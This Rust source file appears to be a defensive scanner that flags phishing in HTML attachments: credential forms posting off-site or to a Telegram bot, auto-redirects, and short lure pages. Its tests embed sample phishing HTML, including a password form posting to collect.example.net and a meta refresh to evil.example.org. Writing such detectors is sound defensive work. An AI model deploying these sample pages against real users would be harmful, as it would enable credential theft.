//! Phishing in HTML attachments (a web page sent as a file): a login form
//! that sends what you type elsewhere, a page that opens a website by
//! itself, or a short page whose only purpose is one outside link. Pages sent
//! inside an e-mail part (base64) are unwrapped first. Nothing is rendered or
//! run here; this reads the page's source.

use airlock_proto::Ind;

/// Web hosts every page uses for fonts, schemas and libraries: not "outside links".
const COMMON: &[&str] = &["w3.org", "schemas.microsoft.com", "fonts.googleapis.com", "fonts.gstatic.com", "gstatic.com", "cdnjs.cloudflare.com", "cdn.jsdelivr.net", "unpkg.com", "schema.org", "ogp.me", "purl.org", "xmlns.com"];

/// Wording of document and account lures, in several languages.
const LURE: &[&str] = &[
    "invoice", "payment", "remittance", "statement", "receipt", "purchase order", "shared a document", "shared a file", "shared with you", "view document",
    "view the document", "open document", "download document", "review document", "secure document", "voicemail", "voice message", "fax", "scanned",
    "e-signature", "docusign", "onedrive", "sharepoint", "dropbox", "verify your", "sign in", "your account", "password", "mailbox", "rechnung",
    "dokument", "zahlung", "facture", "factura", "fattura", "factuur", "documento", "pagamento", "beitragsbescheid",
];

fn b64_value(c: u8) -> Option<u8> {
    Some(match c {
        b'A'..=b'Z' => c - b'A',
        b'a'..=b'z' => c - b'a' + 26,
        b'0'..=b'9' => c - b'0' + 52,
        b'+' => 62,
        b'/' => 63,
        _ => return None,
    })
}

fn b64_decode(s: &str) -> Vec<u8> {
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let (mut acc, mut bits) = (0u32, 0);
    for v in s.bytes().filter_map(b64_value) {
        acc = (acc << 6) | v as u32;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
        }
    }
    out
}

/// An e-mail part ("Content-Transfer-Encoding: base64"): its decoded body.
fn unwrap_mime(text: &str) -> Option<String> {
    let lower = text.to_ascii_lowercase();
    lower.find("content-transfer-encoding: base64")?;
    let body = text.split("\n\n").skip(1).collect::<Vec<_>>().join("\n");
    let body = if body.is_empty() { text.replace("\r\n", "\n").split("\n\n").skip(1).collect::<Vec<_>>().join("\n") } else { body };
    let b64: String = body.replace('\r', "").lines().map(str::trim).filter(|l| l.len() >= 8 && l.bytes().all(|c| b64_value(c).is_some() || c == b'=')).collect();
    let decoded = String::from_utf8_lossy(&b64_decode(&b64)).into_owned();
    (decoded.len() > 32).then_some(decoded)
}

fn host_of(url: &str) -> Option<String> {
    let rest = url.strip_prefix("https://").or_else(|| url.strip_prefix("http://"))?;
    let host: String = rest.chars().take_while(|c| c.is_ascii_alphanumeric() || *c == '.' || *c == '-').collect();
    (!host.is_empty()).then(|| host.trim_start_matches("www.").to_string())
}

fn is_common(host: &str) -> bool {
    COMMON.iter().any(|c| host == *c || host.ends_with(&format!(".{c}")))
}

/// Outside hosts linked with <a href="http..."> and those a form sends to.
fn links(l: &str, attr: &str) -> Vec<String> {
    let mut out = Vec::new();
    for (i, _) in l.match_indices(attr) {
        let v = l[i + attr.len()..].trim_start_matches(['=', ' ', '"', '\'']);
        if let Some(h) = host_of(v).filter(|h| !is_common(h)) {
            if !out.contains(&h) {
                out.push(h);
            }
        }
    }
    out
}

/// The words a reader sees: markup, scripts and styles removed.
fn visible_words(l: &str) -> usize {
    let mut text = String::new();
    let mut rest = l;
    while let Some(i) = rest.find('<') {
        text.push_str(&rest[..i]);
        text.push(' ');
        let tag = &rest[i..];
        let skip_to = if tag.starts_with("<script") { tag.find("</script>").map(|e| e + 9) } else if tag.starts_with("<style") { tag.find("</style>").map(|e| e + 8) } else { tag.find('>').map(|e| e + 1) };
        rest = &tag[skip_to.unwrap_or(tag.len())..];
    }
    text.push_str(rest);
    text.split_whitespace().filter(|w| w.chars().any(char::is_alphabetic)).count()
}

/// `word` as a whole word ("facture" is not inside "manufacture").
fn has_word(hay: &str, word: &str) -> bool {
    hay.match_indices(word).any(|(i, _)| {
        let before = hay[..i].chars().next_back().is_none_or(|c| !c.is_alphanumeric());
        let after = hay[i + word.len()..].chars().next().is_none_or(|c| !c.is_alphanumeric());
        before && after
    })
}

fn check_page(page: &str) -> Vec<(Ind, String)> {
    let l = page.to_ascii_lowercase();
    if !(l.contains("<html") || l.contains("<body") || l.contains("<a ") || l.contains("<form")) {
        return Vec::new();
    }
    let mut out = Vec::new();
    // A login form that posts outside, or a password sent by script.
    let password = l.contains("type=\"password\"") || l.contains("type='password'") || l.contains("type=password");
    let form_hosts = links(&l, "action");
    let sends = !form_hosts.is_empty() || l.contains("api.telegram.org") || ((l.contains("fetch(") || l.contains("xmlhttprequest") || l.contains("$.ajax") || l.contains("$.post")) && l.contains("http"));
    if password && sends {
        let to = if l.contains("api.telegram.org") { "a Telegram bot".to_string() } else if let Some(h) = form_hosts.first() { h.clone() } else { "a server on the internet".into() };
        out.push((Ind::Script, format!("credential: a sign-in form in a file sends what you type to {to}")));
    }
    // Opens a website as soon as it is opened.
    let refresh = l.find("http-equiv=\"refresh\"").or_else(|| l.find("http-equiv=refresh")).and_then(|i| l[i..].find("url=").map(|u| i + u + 4)).and_then(|u| host_of(l[u..].trim_start_matches(['\'', '"'])));
    let scripted = ["location.href", "location.replace(", "window.location=", "window.location =", "location.assign("].iter().find_map(|k| l.find(k).and_then(|i| l[i..].find("http").and_then(|h| (h < 80).then(|| host_of(&l[i + h..])).flatten())));
    if let Some(h) = refresh.or(scripted).filter(|h| !is_common(h)) {
        out.push((Ind::Script, format!("redirect: opening the file sends the browser to {h}")));
    }
    // A short page that exists for one outside link.
    let hrefs = links(&l, "href");
    let words = visible_words(&l);
    let lure = LURE.iter().filter(|w| has_word(&l, w)).take(3).copied().collect::<Vec<_>>();
    if out.is_empty() && !hrefs.is_empty() && hrefs.len() <= 3 && words <= 250 && !lure.is_empty() {
        out.push((Ind::Script, format!("lure: a {words}-word page about \"{}\" whose link goes to {}", lure.join("\", \""), hrefs.join(", "))));
    }
    out
}

pub fn check(doc: &[u8]) -> Vec<(Ind, String)> {
    let text = String::from_utf8_lossy(&doc[..doc.len().min(4 << 20)]).into_owned();
    let mut out = check_page(&text);
    if let Some(inner) = unwrap_mime(&text) {
        out.extend(check_page(&inner).into_iter().map(|(i, t)| {
            let (k, rest) = t.split_once(": ").unwrap_or(("lure", &t));
            (i, format!("{k}: (inside an e-mail attachment) {rest}"))
        }));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    fn kinds(s: &str) -> Vec<String> {
        check(s.as_bytes()).into_iter().map(|(_, t)| t.split(':').next().unwrap().to_string()).collect()
    }
    #[test]
    fn pages() {
        assert_eq!(kinds("<html><form action=\"https://collect.example.net/p.php\"><input type=\"password\"></form></html>"), ["credential"]);
        assert_eq!(kinds("<html><head><meta http-equiv=\"refresh\" content=\"0; url=https://evil.example.org/x\"></head></html>"), ["redirect"]);
        assert_eq!(kinds("<html><body><p>Your invoice is ready.</p><a href=\"https://files.example.biz/inv\">View document</a></body></html>"), ["lure"]);
        // Ordinary pages: documentation with links, a local form.
        let doc = format!("<html><body>{}<a href=\"https://docs.python.org/3/\">docs</a></body></html>", "<p>This chapter explains the module in detail. </p>".repeat(60));
        assert!(kinds(&doc).is_empty());
        assert!(kinds("<html><body><form><input type=\"password\"></form></body></html>").is_empty());
        assert!(kinds("<html><body><p>Generated for manufacture.h</p><a href=\"https://www.doxygen.org/\">doxygen</a></body></html>").is_empty());
        let wrapped = format!("Content-Type: text/html\nContent-Transfer-Encoding: base64\n\n{}\n", "PGh0bWw+PGJvZHk+WW91ciBpbnZvaWNlIGlzIHJlYWR5LiA8YSBocmVmPSJodHRwczovL2ZpbGVzLmV4YW1wbGUuYml6L2kiPlZpZXc8L2E+PC9ib2R5PjwvaHRtbD4=");
        assert_eq!(kinds(&wrapped), ["lure"]);
    }
}
